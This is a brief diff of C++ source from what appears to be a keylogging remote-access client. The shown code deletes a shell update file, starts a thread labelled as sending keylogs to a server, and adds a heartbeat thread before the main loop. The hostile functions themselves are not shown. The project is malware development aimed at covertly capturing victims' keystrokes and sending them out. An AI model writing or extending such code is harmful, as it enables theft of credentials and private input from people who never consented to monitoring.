@@ -130,6 +130,7 @@ non_backup_shell_code:
 	remove(SHELL_PATH(SHELL_UPDATE_NAME));
 
 	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)Client::KeyloggerThread, NULL, NULL, NULL); //Thread to send keylogs to server
+	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)Client::HearthBeatThread, NULL, NULL, NULL); //Thread to send keylogs to server
 
 	//Main loop
 	while (true)
